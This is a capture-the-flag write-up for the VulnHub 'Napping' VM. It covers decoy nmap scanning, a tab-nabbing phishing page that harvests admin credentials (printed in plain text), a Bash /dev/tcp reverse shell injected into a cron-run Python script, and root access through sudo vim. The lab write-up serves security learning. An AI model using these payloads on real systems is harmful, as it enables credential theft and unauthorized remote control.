# Boot2Root CTF: *Napping*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/napping-101,752/) and set it up with Oracle VirtualBox.

Once the machine is up, we get to work.

## Step 1 - Phishing Credentials

We'll start with ```ifconfig``` to know what our IP address, allowing us to infer what IP address the target machine may also have.

![ifconfig](https://user-images.githubusercontent.com/45502375/170439615-e4625d04-5d51-41b0-a6ec-2842cf861004.PNG)

Knowing our IP address is ```10.42.42.6```, we'll use ```sudo nmap -sn -T2 10.42.42.1/24``` to reveal all other machines on the network.

We're using the ```-T2``` flag to slow down our scan and attempt to fly under any firewalls' radars.

![nmap1](https://user-images.githubusercontent.com/45502375/170440398-55e99d84-712a-4ab9-8ad4-80b9689367b1.PNG)

Judging from the traffic we see in a Wireshark capture, it seems to fit right in.

![nmap1-wireshark](https://user-images.githubusercontent.com/45502375/170440651-b34aacc1-cf5e-4bb4-8c32-212a90581a40.PNG)

We can see that our target machine has the IP address of ```10.42.42.7```, now we can use more aggressive scans.

We also see that there are a few other hosts on the network as well. Because Nmap scans are generally very noisy, we'll try to hide ourselves amongst a bunch of decoys.

To perform this, we'll use ```sudo nmap -sS -v -D10.42.42.3,10.42.42.4,10.42.42.6,10.42.42.8,10.42.42.9,10.42.42.12,10.42.42.14 10.42.42.7 | grep 'open'```.

![nmap2](https://user-images.githubusercontent.com/45502375/170440961-6762605c-2e0b-4096-9f85-057ca9e4de73.PNG)

Looking at the Wireshark capture, it seems we've at least made the Network Admin's job a little bit more difficult.

![nmap2-wireshark](https://user-images.githubusercontent.com/45502375/170441007-8107bb9c-238d-4a69-8b6d-85d115443a97.PNG)

Ultimately, the scan reveals ports ```80``` and ```22``` are accessible. We can't do anything with SSH yet, so let's see if there's a website.

Attempting to visit ```http://10.42.42.7/``` leads to a Login page. It lets us create an account so we'll do that and log in.

![website1](https://user-images.githubusercontent.com/45502375/170441060-0b28b0b2-dd8d-4a7e-a52e-1cc3cdf273c7.PNG)

The website lets us upload a link, with a sort of 'guarantee' that the administrator will open it to investigate. We'll come back to this later.

![website2](https://user-images.githubusercontent.com/45502375/170441084-2b2b9819-07c8-4ee1-a709-e527f0a4c994.PNG)

When we submit any link (or nothing at all), it shows us the same link we submitted as a hyperlink.

![website3](https://user-images.githubusercontent.com/45502375/170441157-a1bf1c78-f98b-424d-8129-739ad3a6b1c1.PNG)

Upon looking at the source code of *this* version of the website in particular, we see exactly how the hyperlink is formatted.

![website3-source](https://user-images.githubusercontent.com/45502375/170441173-a225e248-ebde-46f9-b674-6f2afae3658f.PNG)

More specifically, we see that it implements ```target='_blank'``` in the hyperlink.

![vuln](https://user-images.githubusercontent.com/45502375/170441194-1ec6fadc-9551-4809-9f14-d74bf8b3f181.PNG)

This is how we're going to exploit the website.

## Exploitation

Using *target='_blank'* allows a Tab Nabbing vulnerability to take place, allowing an attacker to have partial access to the linking page from the linked page.

As explained by Alex Yumashev of JitBit, 

*"The newly opened tab can then change the ```window.opener.location``` to some phishing page. Users trust the page that is already opened, they won't get suspicious."*

You can read the full post about it [here](https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/)

Therefore, to exploit this, we have to create a webpage that contains a ```window.opener.location``` variable that can redirect to another malicious webpage.

Given that the administrator is always going to click on the links we submit, we can trick him into handing over his login credentials by faking the Login page and convincing him that he was suddenly logged out.

The first step to this is saving the Login page. We'll present this later as our phishing page.

![exploit2](https://user-images.githubusercontent.com/45502375/170441444-b7deb66f-6070-4416-a4b8-74d9021db730.PNG)

Next, we'll create the malicious page that will redirect to our phishing page using ```window.opener.location```.

To do this, we can use the following HTML code:

```
<!DOCTYPE html>
<html>
	<body>
		<script>
			window.opener.location = "http://127.0.0.1:8000/evilsite.html";
		</script>
	</body>
</html>
```

Here, ```blog.html``` will be the redirecting page and ```index.html``` will be the phishing page to redirect to.

![exploit3](https://user-images.githubusercontent.com/45502375/170441571-79e76b46-89bb-4c43-b1c5-a5e9bb27891b.PNG)

To host this website on port ```80```, we'll use a Python module called ```http.server``` on Kali Linux using the command ```sudo python3 -m http.server 80```

![exploit4](https://user-images.githubusercontent.com/45502375/170441583-9d2807cd-82db-45b3-af04-b4a1f8824594.PNG)

We will also run a NetCat listener on port ```8000``` to capture the credentials we harvest from our phishing page at the same time.

![exploit5](https://user-images.githubusercontent.com/45502375/170441599-d7b9a6de-7159-4c33-86e4-0c04a0bba8e2.PNG)

All that's left to do is present the link to the administrator and wait for him to click on it.

![exploit6](https://user-images.githubusercontent.com/45502375/170441611-37b9a9b7-92ea-4f6f-bc6e-14b555a32d86.PNG)

Boom...

![exploit7](https://user-images.githubusercontent.com/45502375/170441630-29ec15a0-a470-4a2e-8f8c-1352ebdef89b.PNG)

...Chicka Boom.

![credentials](https://user-images.githubusercontent.com/45502375/170441645-adb38cd4-fa63-440e-bd32-42d27da45b92.PNG)

## Step 2 - Changing Roles

Now that we have the credentials ```daniel:C@ughtm3napping123```, we can try to login via SSH.

![ssh](https://user-images.githubusercontent.com/45502375/170441676-0d34ca24-fcb8-4d89-8bb0-633997e6d8b0.PNG)

Upon logging in, we try - and fail - to become a superuser.

![sudosu](https://user-images.githubusercontent.com/45502375/170441687-b470e136-cd94-4215-afa4-e2154a373da0.PNG)

Alternatively, let's see what we can already use. We'll identify what group we're in by using ```groups```.

Then, we'll see what applications we have access to by using ```find / -group [GROUPNAME] -type f 2>/dev/null```.

![privesc1](https://user-images.githubusercontent.com/45502375/170441705-cf4bfe00-97ac-4025-882c-73c78b23c4ae.PNG)

We see that there's a Python script at ```/home/adrian/query.py```. Let's investigate it.

The script seems to query the web server to check if it's online and writes the results to a file ```site_status.txt```.

![privesc2](https://user-images.githubusercontent.com/45502375/170441720-e02743b9-18b5-40f4-af07-08b770695c63.PNG)

Upon investigating the subsequent file, it seems the query occurs every two minutes.

![privesc3](https://user-images.githubusercontent.com/45502375/170441733-fb120ccd-fe00-4e39-9abf-b0f329b879d9.PNG)

Given that we are part of the ```administrators``` group, we can assume we have write permissions over other users' files.

We can now try to become ```adrian``` by creating a reverse shell script and adding two lines in ```query.py``` to call it.

The reasoning behind this is we can assume that the script is automatically running under the user ```adrian```. While we don't currently know what group he's in or what privileges he owns, we'll at least be finding/doing something otherwise not possible while in ```daniel```'s account.

We will create the script ```shell.sh``` in ```/dev/shm```, in shared memory.

We can create the script using the following Bash code:

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```

![privesc4](https://user-images.githubusercontent.com/45502375/170441742-2edc6ed9-b6d8-4637-a90e-6671d235214c.PNG)

Then, we will edit ```query.py``` to include the following lines, executing the shell:

```
...
import os

os.system('/usr/bin/bash /dev/shm/shell.sh')
...
```

![privesc5](https://user-images.githubusercontent.com/45502375/170441757-6d3fe6db-a2f2-4155-a24f-64ed5ebaef10.PNG)

Now we can start another NetCat listener on port ```5555``` and successfully gain access as ```adrian```.

![privesc6](https://user-images.githubusercontent.com/45502375/170441772-d4643444-6c2e-4535-a40b-ffab339bf02c.PNG)

Next we'll upgrade to a full TTY shell using the following commands/steps:

	1 - python3 -c 'import pty;pty.spawn("/bin/bash")'
	
	2 - (press Ctrl+Z)
	
	3 - stty raw -echo;fg
	
	4 - (press ENTER twice)
	
	5 - export TERM=xterm

![privesc7](https://user-images.githubusercontent.com/45502375/170443449-e8594ee8-8868-45a7-82e3-7b2d76ada2ff.PNG)

## Step 3 - Privilege Escalation

The command ```sudo -l``` shows that we can run vim as root without a password (really?...):

![privesc8](https://user-images.githubusercontent.com/45502375/170441805-bc0b5d81-1378-4a0b-8889-af24eedd3701.PNG)

Searching for "vim privilege escalation", we find the following results:

![search](https://user-images.githubusercontent.com/45502375/170441821-dde67e4a-eae5-484c-b531-26e77263423f.PNG)

According to [GTFOBins](https://gtfobins.github.io/gtfobins/vim/), we can break out from restricted environments and spawn an interactive system shell using  ```vim -c ':!/bin/sh'```

![gtfobins](https://user-images.githubusercontent.com/45502375/170441858-202a15ec-7855-4a91-9ef1-556221e0c699.PNG)

Therefore, combined with what we already know, we can use the command ```sudo vim -c ':!/bin/sh'``` to perform a privilege escalation.

![privesc9](https://user-images.githubusercontent.com/45502375/170441881-7057fb7d-6ace-4cda-a248-fd16b43419de.PNG)

And we are root.

![root](https://user-images.githubusercontent.com/45502375/170441899-339ef6ca-e76d-455e-b88e-fe0cdc0aab55.PNG)

## Conclusion

This box was a lot of fun to do, and taught me lots of new things.

- First, I learned about Tab Nabbing and how it worked, which allowed me to perform the phishing attack.
- I learned about Linux's shared memory implementation through the ```/dev/shm``` directory.
- I also learned how to perform a privilege escalation using Vim. However, for this to work we would need to assume that sudo could be used without a password, for whatever reason...

The premise of this box is a little silly, but it's a learning experience all the same. It took a few hours to figure these things out and a *lot* of research was involved in the process, as these things go.
